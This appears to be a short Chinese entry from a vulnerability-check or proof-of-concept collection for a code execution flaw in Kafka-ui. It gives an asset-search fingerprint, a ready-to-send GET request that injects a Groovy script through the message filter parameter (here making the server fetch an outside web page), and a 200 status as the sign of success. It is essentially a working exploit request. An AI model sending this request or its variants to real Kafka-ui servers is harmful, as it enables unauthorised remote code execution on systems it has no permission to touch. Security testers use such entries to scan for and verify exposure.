# Kafka-ui代码执行漏洞

Kafka ｜ 命令执行 ｜ —
- **指纹**：`app="kafka-ui"`
- **请求**：`GET /api/clusters/local/topics/__consumer_offsets/messages?q=new%20URL%28%22https%3A//www.baidu.com/%22%29.text&filterQueryType=GROOVY_SCRIPT&attempt=2&limit=100&page=0&seekDirection=FORWARD&keySerde=`
- **响应特征**：200